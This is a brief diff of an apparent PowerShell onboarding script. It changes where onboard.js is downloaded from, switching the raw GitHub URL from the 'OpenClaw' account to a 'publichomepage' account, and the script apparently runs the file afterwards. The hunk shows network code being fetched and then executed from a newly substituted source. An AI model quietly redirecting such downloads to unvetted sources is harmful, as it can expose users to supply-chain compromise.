@@ -49,7 +49,7 @@ Write-Host -ForegroundColor Cyan "`nPhase 2: Configuration"
 
 if (-not (Test-Path "./onboard.js")) {
     Write-Host -ForegroundColor Gray "Downloading onboarding logic..."
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OpenClaw/claw-connect/main/onboard.js" -OutFile "./onboard.js"
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/publichomepage/claw-connect/main/onboard.js" -OutFile "./onboard.js"
 }
 
 # Run the onboarding logic
